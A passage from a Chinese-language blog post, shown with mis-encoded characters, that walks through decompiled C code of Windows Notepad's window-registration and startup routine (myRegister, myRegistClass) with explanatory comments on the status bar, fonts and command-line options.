æ›´æ–°å½“å‰è¡Œå·</span></span><br><span class="line">  historyColNumber = logicColNumber;</span><br><span class="line">  <span class="keyword">return</span> colIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>é’©å­å¯¹äºEVENT_OBJECT_LOCATIONCHANGEæ„Ÿå…´è¶£,åªè¦æ˜¯<strong>è¾“å…¥ä½ç½®</strong>å‘ç”Ÿå˜åŒ–å°±ä¼šæ”¶åˆ°è¯¥é’©å­æ¶ˆæ¯</p>
<p>è¯¥é’©å­çš„ä½œç”¨æ˜¯,æ›´æ–°è®°å½•çš„é¼ æ ‡ä½ç½®,å¹¶å‘çŠ¶æ€æ¡†å‘é€æ¶ˆæ¯,è®©çŠ¶æ€æ¡†å®æ—¶æ˜¾ç¤ºå½“å‰è¾“å…¥ä½ç½®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220912153846116.png" alt="å•¥æ˜¯çŠ¶æ€æ "></p>
<p>è¿™ä¸ªé’©å­åœ¨æ¶ˆæ¯å¾ªç¯ä¹‹å‰æ³¨å†Œç”Ÿæ•ˆ,åœ¨æ¶ˆæ¯å¾ªç¯ä¹‹åææ„,å¯ä»¥è®¤ä¸ºåœ¨notepadä¸»çª—å£çš„å¯è§æ—¶æœŸå†…,é’©å­éƒ½æ˜¯ç”Ÿæ•ˆçš„,åªè¦æ˜¯å¼€å¯äº†çŠ¶æ€æ ,é’©å­å°±ä¼šé€šçŸ¥çŠ¶æ€æ æ›´æ–°è¾“å…¥ä½ç½®çŠ¶æ€</p>
<p>åˆ°æ­¤é’©å­å‡½æ•°åˆ†æå®Œæ¯•,ä¸‹é¢éœ€è¦çœ‹çœ‹myRegisteréƒ½æ˜¯æ³¨å†Œäº†ä»€ä¹ˆ,ç„¶åçœ‹çœ‹ä¸»çª—å£,æœç´¢æ¡†,çŠ¶æ€æ å„è‡ªçš„çª—å£è¿‡ç¨‹æ˜¯å•¥æ ·çš„</p>
<h2 id="å•¥éƒ½å¹²myRegister"><a href="#å•¥éƒ½å¹²myRegister" class="headerlink" title="å•¥éƒ½å¹²myRegister"></a>å•¥éƒ½å¹²myRegister</h2><p>WinMainä¸­æ˜¯è¿™æ ·è°ƒç”¨myRegisterå‡½æ•°çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myRegister(hInstance, hPrevInstance, pureCMDLine, nCmdShow)</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„çš„pureCMDLineå·²ç»å‰¥å»äº†ç¬¬ä¸€ä¸ªå‚æ•°,å³ç¨‹åºä½ç½®</p>
<p>myRegisterå¹²äº†å¾ˆå¤šäº‹,åŒ…æ‹¬</p>
<p>æ³¨å†Œä¸»çª—å£ç±»</p>
<p>åˆ›å»ºä¸»çª—å£å®ä¾‹</p>
<p>åˆ›å»ºçŠ¶æ€æ çª—å£</p>
<p>åˆå§‹åŒ–èœå•</p>
<p>å‘½ä»¤è¡Œåˆ†æ(åç¼–è¯‘å®åœ¨å¤ªä¹±,ä¸€æ—¶é—´çœ‹ä¸æ¸…éƒ½å¹²äº†å•¥)</p>
<p>ç²—ç•¥ä¸Šçœ‹å‘½ä»¤è¡Œåˆ†ææ”¯æŒä»å‘½ä»¤è¡Œæ‰“å¼€å·²æœ‰æ–‡ä»¶,æ–°å»ºæ–‡ä»¶,æ”¹å˜ç¼–ç æ–¹å¼ç­‰ç­‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">myRegister</span><span class="params">(HINSTANCE hInstance, HGDIOBJ oldhFont, LPSTR pureCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">  HINSTANCE hInst; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  HACCEL hAccelerator; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// ecx</span></span><br><span class="line">  HWND hwnd; <span class="comment">// edx</span></span><br><span class="line">  HMENU hMenu; <span class="comment">// eax</span></span><br><span class="line">  HMENU hSubMenu; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> hDeviceCaps; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *iterCMD; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *CopyIterCMD; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  WCHAR Name[<span class="number">32</span>]; <span class="comment">// [esp+8h] [ebp-98h] BYREF</span></span><br><span class="line">  WINDOWPLACEMENT wndpl; <span class="comment">// [esp+48h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">Rect</span>;</span> <span class="comment">// [esp+74h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">rectStatus</span>;</span> <span class="comment">// [esp+84h] [ebp-1Ch] BYREF</span></span><br><span class="line">  LPARAM lParam[<span class="number">2</span>]; <span class="comment">// [esp+94h] [ebp-Ch] BYREF</span></span><br><span class="line">  HDC hdc; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  WM_FINDREPLACE = RegisterWindowMessageW(<span class="string">L&quot;commdlg_FindReplace&quot;</span>);<span class="comment">// æ³¨å†Œäººå·¥æ¶ˆæ¯,åªè¦æ˜¯è°ƒç”¨æŸ¥æ‰¾æ¡†å°±ä¼šå‘å‡ºè¯¥æ¶ˆæ¯</span></span><br><span class="line">  <span class="keyword">if</span> ( !WM_FINDREPLACE )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  WM_HELP = RegisterWindowMessageW(<span class="string">L&quot;commdlg_help&quot;</span>);<span class="comment">// æ³¨å†Œå¸®åŠ©æ¡†æ¶ˆæ¯</span></span><br><span class="line">  <span class="keyword">if</span> ( !WM_HELP )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hdc = GetDC(<span class="number">0</span>);                               <span class="comment">// è®¾å¤‡ç¯å¢ƒå¥æŸ„</span></span><br><span class="line">  <span class="keyword">if</span> ( !hdc )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hInst = hInstance;                            <span class="comment">// åº”ç”¨ç¨‹åºå¥æŸ„</span></span><br><span class="line">  <span class="keyword">if</span> ( !sub_1003D57(hInstance) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v6 = GetSystemMetrics(<span class="number">41</span>);                    <span class="comment">// SM_PENWINDOWS,è¿˜æ˜¯å’ŒPenç›¸å…³çš„,è€å¤è‘£äº†</span></span><br><span class="line">  hCursor_0 = LoadCursorW(<span class="number">0</span>, (<span class="number">32513</span> - (v6 != <span class="number">0</span>)));<span class="comment">// åŠ è½½äº†ä¸€ä¸ªå¯‚å¯</span></span><br><span class="line">  hCursor = LoadCursorW(<span class="number">0</span>, <span class="number">0x7F02</span>);             <span class="comment">// 32706å·å…‰æ ‡ç±»å‹?ç„¶è€Œä¸æ˜¯ç³»ç»Ÿé¢„å®šä¹‰çš„?</span></span><br><span class="line">  hAccelerator = LoadAcceleratorsW(hInst, <span class="string">L&quot;MainAcc&quot;</span>);<span class="comment">// åŠ è½½é”®ç›˜åŠ é€Ÿé”®</span></span><br><span class="line">  hAccTable = hAccelerator;                     <span class="comment">// è¿™æ‹·è´äº†ä¸€ä¸ªå¯‚å¯å§</span></span><br><span class="line">  <span class="keyword">if</span> ( !hCursor || !hAccelerator || !oldhFont &amp;&amp; !myRegistClass(hInst) )<span class="comment">// çœ‹çœ‹è¿™ä¸€ä¼™å­éƒ½å°±ä½äº†å—</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ::hInstance = hInst;</span><br><span class="line">  psdw.lStructSize = <span class="number">84</span>;                        <span class="comment">// é¡µé¢è®¾ç½®</span></span><br><span class="line">  psdw.hDevMode = <span class="number">0</span>;</span><br><span class="line">  psdw.hDevNames = <span class="number">0</span>;</span><br><span class="line">  psdw.hInstance = hInst;</span><br><span class="line">  sub_10018DF(v8);                              <span class="comment">// é¡µé¢è®¾ç½®ç›¸å…³</span></span><br><span class="line">  setFont();                                    <span class="comment">// å­—ä½“è®¾ç½®ç›¸å…³</span></span><br><span class="line">  hwnd = CreateWindowExW(<span class="number">0</span>, ClassName, &amp;szText, WS_OVERLAPPEDWINDOW, X, Y, nWidth, nHeight, <span class="number">0</span>, <span class="number">0</span>, hInst, <span class="number">0</span>);<span class="comment">// åˆ›å»ºçª—å£å®ä¾‹,çª—å£ç±»ClassName=&quot;notepad&quot;å·²ç»åœ¨myRegisterClassæ³¨å†Œè¿‡</span></span><br><span class="line">  hwndParent = hwnd;</span><br><span class="line">  psdw.hwndOwner = hwnd;</span><br><span class="line">  <span class="keyword">if</span> ( !hwnd )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nWidth != <span class="number">0x80000000</span> &amp;&amp; nHeight != <span class="number">0x80000000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;wndpl, <span class="number">0</span>, <span class="keyword">sizeof</span>(wndpl));</span><br><span class="line">    wndpl.rcNormalPosition.left = X;            <span class="comment">// è®¾ç½®çª—å£åœ¨å±å¹•ä¸Šçš„ä½ç½®ä¿¡æ¯</span></span><br><span class="line">    wndpl.rcNormalPosition.right = nWidth + X;</span><br><span class="line">    wndpl.rcNormalPosition.top = Y;</span><br><span class="line">    wndpl.rcNormalPosition.bottom = nHeight + Y;</span><br><span class="line">    wndpl.length = <span class="number">44</span>;</span><br><span class="line">    SetWindowPlacement(hwnd, &amp;wndpl);</span><br><span class="line">    hwnd = hwndParent;</span><br><span class="line">  &#125;</span><br><span class="line">  DragAcceptFiles(hwnd, <span class="number">1</span>);                     <span class="comment">// å…è®¸å¾€hwndçª—å£æ‹–æ‹½æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">  GetClientRect(hwndParent, &amp;Rect);             <span class="comment">// è·å–ä¸»çª—å£å®¢æˆ·åŒº</span></span><br><span class="line">  hWnd = CreateWindowExW(                       <span class="comment">// åˆ›å»ºç¼–è¾‘æ§ä»¶çª—å£,ä»¥ä¸»çª—å£ä½œä¸ºçˆ¶çª—å£,å æ®ä¸»çª—å£çš„æ•´ä¸ªå®¢æˆ·åŒº</span></span><br><span class="line">           <span class="number">0x200</span>u,</span><br><span class="line">           <span class="string">L&quot;Edit&quot;</span>,</span><br><span class="line">           &amp;szText,</span><br><span class="line">           wParam1 != <span class="number">0</span> ? <span class="number">0x50200104</span> : <span class="number">0x50300104</span>,<span class="comment">// æ˜¯å¦å…·æœ‰æ°´å¹³æ»šåŠ¨è½´</span></span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           Rect.right,</span><br><span class="line">           Rect.bottom - <span class="number">100</span>,</span><br><span class="line">           hwndParent,</span><br><span class="line">           <span class="number">0xF</span>,</span><br><span class="line">           hInstance,</span><br><span class="line">           <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hWnd )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hwndStatus = CreateStatusWindowW(             <span class="comment">// åˆ›å»ºçŠ¶æ€æ çª—å£å®ä¾‹</span></span><br><span class="line">                 (*&amp;isStatusWndVisible != <span class="number">0</span> ? WS_VISIBLE : <span class="number">0</span>) | <span class="number">0x44800000</span>,<span class="comment">// WS_CHILD|WS_CLIPSIBLINGS|WS_BORDER</span></span><br><span class="line">                                                <span class="comment">// å­çª—å£|è¢«å…¶ä»–å­çª—å£é‡å æ—¶ä¸é‡ç»˜|å…·æœ‰è¾¹çº¿</span></span><br><span class="line"></span><br><span class="line">                 &amp;szText,</span><br><span class="line">                 hwndParent,</span><br><span class="line">                 <span class="number">0x401</span>u);                       <span class="comment">// çŠ¶æ€æ çª—å£æ§åˆ¶æ ‡è¯†ç¬¦</span></span><br><span class="line">  <span class="keyword">if</span> ( !hwndStatus )                            <span class="comment">// æ£€æµ‹çŠ¶æ€æ çª—å£æ˜¯å¦åˆ›å»ºæˆåŠŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hookfunc(<span class="number">1</span>);                                  <span class="comment">// åˆ›å»ºå®ŒçŠ¶æ€æ çª—å£ä¹‹åç«‹åˆ»æ›´æ–°å½“å‰è¡Œå·åˆ—å·çŠ¶æ€,å¦‚æœçŠ¶æ€æ å¯è§åˆ™é€šçŸ¥çŠ¶æ€æ é‡ç»˜</span></span><br><span class="line">  GetClientRect(hwndStatus, &amp;rectStatus);       <span class="comment">// è·å–çŠ¶æ€çª—å£çš„å®¢æˆ·åŒº</span></span><br><span class="line">  cyStatus = rectStatus.bottom - rectStatus.top;<span class="comment">// çŠ¶æ€æ é«˜åº¦</span></span><br><span class="line">  lParam[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  lParam[<span class="number">0</span>] = <span class="number">3</span> * (rectStatus.right - rectStatus.left) / <span class="number">4</span>;</span><br><span class="line">  SendMessageW(hwndStatus, SB_SETPARTS, <span class="number">2u</span>, lParam);<span class="comment">// çŠ¶æ€æ åˆ†æˆä¸¤éƒ¨åˆ†,0å·éƒ¨åˆ†å æ®äº†çŠ¶æ€æ çš„å‰å››åˆ†ä¹‹ä¸‰,1å·éƒ¨åˆ†å æ®å‰©ä¸‹æ‰€æœ‰</span></span><br><span class="line">  SendMessageW(hWnd, EM_FMTLINES, wParam1, <span class="number">0</span>);  <span class="comment">// wParam1æ ‡å¿—ç€æ˜¯å¦è‡ªåŠ¨æ¢è¡Œ,å¦‚æœwParam1=1åˆ™ä¸è‡ªåŠ¨æ¢è¡Œ,wParam=0åˆ™è‡ªåŠ¨æ¢è¡Œ</span></span><br><span class="line">  <span class="keyword">if</span> ( wParam1 )                                <span class="comment">// å¦‚æœä¸è‡ªåŠ¨æ¢è¡Œ</span></span><br><span class="line">  &#123;</span><br><span class="line">    hMenu = GetMenu(hwndParent);</span><br><span class="line">    hSubMenu = GetSubMenu(hMenu, <span class="number">3</span>);            <span class="comment">// çˆ¶çª—å£çš„ç¬¬ä¸‰ä¸ªèœå•,æŸ¥çœ‹,çŠ¶æ€æ </span></span><br><span class="line">    EnableMenuItem(hSubMenu, <span class="number">0x1B</span>u, <span class="number">1u</span>);        <span class="comment">// 0x1Bå·èœå•ä½¿èƒ½,æ¨æµ‹æ˜¯çŠ¶æ€æ ä½¿èƒ½</span></span><br><span class="line">  &#125;</span><br><span class="line">  hDeviceCaps = GetDeviceCaps(hdc, <span class="number">90</span>);         <span class="comment">// è·å–è®¾å¤‡ä¿¡æ¯</span></span><br><span class="line">  lf.lfHeight = -MulDiv(*&amp;nNumber, hDeviceCaps, <span class="number">720</span>);</span><br><span class="line">  hFont = CreateFontIndirectW(&amp;lf);             <span class="comment">// åŠ è½½å­—ä½“</span></span><br><span class="line">  oldhFont = SelectObject(hdc, hFont);          <span class="comment">// å°†æ–°å­—ä½“é€‰å…¥è®¾å¤‡ç¯å¢ƒ</span></span><br><span class="line">  GetTextFaceW(hdc, <span class="number">32</span>, Name);                  <span class="comment">// è·å¾—å½“å‰ä½¿ç”¨çš„å­—ä½“åç§°</span></span><br><span class="line">  SelectObject(hdc, oldhFont);</span><br><span class="line">  <span class="keyword">if</span> ( lstrcmpiW(Name, lf.lfFaceName) )         <span class="comment">// å¦‚æœç›®å‰çš„å­—ä½“å’ŒåŸæ¥è®°å½•çš„å­—ä½“ä¸åŒåˆ™æ›´æ–°</span></span><br><span class="line">  &#123;</span><br><span class="line">    EnumFontsW(hdc, lf.lfFaceName, Proc, &amp;lf);</span><br><span class="line">    DeleteObject(hFont);</span><br><span class="line">    hFont = CreateFontIndirectW(&amp;lf);</span><br><span class="line">  &#125;</span><br><span class="line">  SendMessageW(hWnd, WM_SETFONT, hFont, <span class="number">0</span>);     <span class="comment">// é€šçŸ¥hWndçª—å£æ”¹å˜å­—ä½“,hWndæ˜¯ç¼–è¾‘æ§ä»¶å¥æŸ„</span></span><br><span class="line">  ReleaseDC(<span class="number">0</span>, hdc);</span><br><span class="line">  word_1009800 = <span class="number">0</span>;</span><br><span class="line">  hMem = LocalAlloc(<span class="number">0x42</span>u, <span class="number">2u</span>);</span><br><span class="line">  PostMessageW(hWnd, EM_LIMITTEXT, <span class="number">0</span>, <span class="number">0</span>);       <span class="comment">// è®¾ç½®hWndçª—å£çš„å­—æ•°é™åˆ¶</span></span><br><span class="line">  sub_1001C5B(lpString2);</span><br><span class="line">  ShowWindow(hwndParent, nCmdShow);             <span class="comment">// æ˜¾ç¤ºçª—å£</span></span><br><span class="line">  SetCursor(hCursor_0);                         <span class="comment">// ä¿®æ”¹å…‰æ ‡</span></span><br><span class="line">  iterCMD = getNextCMD(pureCmdLine);	<span class="comment">//ä»è¿™é‡Œå¼€å§‹å°±æ˜¯å¯¹äºå‘½ä»¤è¡Œçš„å¤„ç†äº†</span></span><br><span class="line">  encodingMode = <span class="number">-1</span>;</span><br><span class="line">  CopyIterCMD = iterCMD;</span><br><span class="line">  <span class="keyword">if</span> ( !Lstrcmp(iterCMD, <span class="string">L&quot;/A&quot;</span>) )               <span class="comment">// å‘½ä»¤è¡Œä¸Šæ˜¯å¦æœ‰/A</span></span><br><span class="line">  &#123;</span><br><span class="line">    encodingMode = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    CopyIterCMD = getNextCMD(CopyIterCMD + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !Lstrcmp(CopyIterCMD, <span class="string">L&quot;/W&quot;</span>) )           <span class="comment">// å‘½ä»¤è¡Œä¸Šæ˜¯å¦æœ‰/W</span></span><br><span class="line">    encodingMode = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( encodingMode != <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">LABEL_26:</span><br><span class="line">  v15 = sub_1003E29(CopyIterCMD);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_1003F7F(CopyIterCMD, nCmdShow) )</span><br><span class="line">    &#123;</span><br><span class="line">      PostMessageW(hwndParent, WM_CLOSE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *CopyIterCMD )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1003C5B(FileName, CopyIterCMD);</span><br><span class="line">      hFile = CreateFileW(FileName, <span class="number">0x80000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);<span class="comment">// å‘½ä»¤è¡Œä¸ŠæŒ‡å®šçš„æ–‡ä»¶ä¸å­˜åœ¨,éœ€è¦æ–°å»º</span></span><br><span class="line">      <span class="keyword">if</span> ( hFile != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">      <span class="keyword">if</span> ( GetLastError() == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = sub_1001F55(hwndParent, lpCaption, dword_1008020, FileName, <span class="number">0x33</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( v16 == <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v16 == <span class="number">6</span> )</span><br><span class="line">          hFile = CreateFileW(FileName, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_1004A24(FileName);</span><br><span class="line">        sub_1001C5B(lpString2);</span><br><span class="line">        lstrcpyW(FileName, lpString2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( hFile != <span class="number">-1</span> )</span><br><span class="line">LABEL_41:</span><br><span class="line">        sub_1004D75(FileName, encodingMode);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">    sub_10040D7(&amp;word_10095E0);</span><br><span class="line">    sub_10040D7(&amp;word_1009540);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;ofnw, <span class="number">0</span>, <span class="keyword">sizeof</span>(ofnw));</span><br><span class="line">    ofnw.hInstance = hInstance;                 <span class="comment">// ä¿å­˜/å¦å­˜ä¸ºæ¡† ç»“æ„ä½“</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;findReplace, <span class="number">0</span>, <span class="keyword">sizeof</span>(findReplace));</span><br><span class="line">    ofnw.lStructSize = <span class="number">88</span>;</span><br><span class="line">    ofnw.hwndOwner = hwndParent;</span><br><span class="line">    ofnw.nMaxFile = <span class="number">260</span>;</span><br><span class="line">    findReplace.lStructSize = <span class="number">40</span>;</span><br><span class="line">    findReplace.hwndOwner = hwndParent;</span><br><span class="line">    SendMessageW(hWnd, EM_GETSEL, &amp;nCmdShow, &amp;hInstance);</span><br><span class="line">    SendMessageW(hWnd, EM_SETSEL, nCmdShow, hInstance);</span><br><span class="line">    SendMessageW(hWnd, EM_SCROLLCARET, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (GetKeyboardLayout(<span class="number">0</span>) &amp; <span class="number">0x3FF</span>) == <span class="number">0x11</span> )<span class="comment">// è·å–é”®ç›˜å¸ƒå±€æ¨¡å¼</span></span><br><span class="line">      SendMessageW(hWnd, EM_SETIMESTATUS, <span class="number">1u</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ³¨å†Œçª—å£ç±»myRegistClass"><a href="#æ³¨å†Œçª—å£ç±»myRegistClass" class="headerlink" title="æ³¨å†Œçª—å£ç±»myRegistClass"></a>æ³¨å†Œçª—å£ç±»myRegistClass</h2><p>åˆ›å»ºä¸»çª—å£ç±»,æ²¡ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall myRegistClass@&lt;eax&gt;(HINSTANCE a1@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  WNDCLASSEXW WndClass; <span class="comment">// [esp+4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  WndClass.cbSize = <span class="number">48</span>;</span><br><span class="line">  v1 = GetSystemMetrics(<span class="number">41</span>);</span><br><span class="line">  WndClass.hCursor = LoadCursorW(<span class="number">0</span>, (<span class="number">32513</span> - (v1 != <span class="number">0</span>)));</span><br><span class="line">  WndClass.hIcon = LoadIconW(a1, <span class="number">2</span>);</span><br><span class="line">  WndClass.hIconSm = LoadImageW(a1, <span class="number">2</span>, <span class="number">1u</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">  WndClass.lpszMenuName = <span class="number">1</span>;</span><br><span class="line">  WndClass.hInstance = a1;</span><br><span class="line">  WndClass.lpszClassName = ClassName;<span class="comment">//å…³é”®,è®¾ç½®ä¸»çª—å£ç±»å</span></span><br><span class="line">  WndClass.lpfnWndProc = WndProc;<span class="comment">//å…³é”®,æ³¨å†Œä¸»çª—å£è¿‡ç¨‹</span></span><br><span class="line">  WndClass.hbrBackground = <span class="number">6</span>;</span><br><span class="line">  WndClass.style = <span class="number">0</span>;</span><br><span class="line">  WndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  WndClass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> RegisterClassExW(&amp;WndClass) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

